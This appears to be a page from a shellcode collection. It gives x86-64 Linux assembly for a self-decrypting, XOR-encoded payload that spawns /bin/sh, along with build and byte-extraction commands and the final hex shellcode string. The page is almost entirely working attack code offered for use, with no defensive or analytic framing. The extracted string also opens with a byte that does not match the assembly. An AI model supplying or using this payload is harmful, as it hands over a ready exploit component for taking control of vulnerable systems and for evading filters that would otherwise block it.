---
layout: default
title: Self-Decrypting XOR Encrypted execve("/bin/sh", NULL, 0) - Spawn shell
permalink: /shellcode/asm-19.html
os: Linux
arch: Intel x86-64
length: 69
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
    jmp payload                 ; jump to the "payload" label

decrypt:
    pop rdi                     ; pop the address of the shellcode into rdi
    push 0x45                   ; push the XOR key 0x45
    push 0x1E                   ; push the loop counter (length of shellcode)
    pop rcx                     ; pop 0x1E into rcx
    pop rbx                     ; pop 0x45 into rbx

    sub rsp, rcx                ; subtract the length of the shellcode from rsp

    xor rax, rax                ; null rax

dec_loop:
    dec rcx                     ; decrement rcx by 1
    mov al, byte [rdi + rcx]    ; move a byte from rdi + rcx into al
    xor al, bl                  ; XOR al against the XOR key in bl
    mov byte [rsp + rcx], al    ; move the XOR'ed byte from al into rsp + rcx
    test rcx, rcx               ; check if rcx is 0
    jne dec_loop                ; if rcx is not 0, continue looping
    jmp rsp                     ; if rcx is 0, jump to the decrypted shellcode

payload:
    call decrypt                ; call the decrypt function
    ; define the XOR encrypted shellcode
    db 0x0d, 0x74, 0x97, 0x17, 0x0d, 0xfd, 0x6a, 0x27, 0x2c, 0x2b, 0x6a, 0x6a, 0x36, 0x2d, 0x15, 0x0d, 0xcc, 0xa2, 0x17, 0x12, 0x0d, 0xcc, 0xa3, 0x0d, 0x74, 0x85, 0xf5, 0x7e, 0x4a, 0x40
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x64\xeb\x1f\x5f\x6a\x45\x6a\x1e\x59\x5b\x48\x29\xcc\x48\x31\xc0\x48\xff\xc9\x8a\x04\x0f\x30\xd8\x88\x04\x0c\x48\x85\xc9\x75\xf0\xff\xe4\xe8\xdc\xff\xff\xff\x0d\x74\x97\x17\x0d\xfd\x6a\x27\x2c\x2b\x6a\x6a\x36\x2d\x15\x0d\xcc\xa2\x17\x12\x0d\xcc\xa3\x0d\x74\x85\xf5\x7e\x4a\x40
```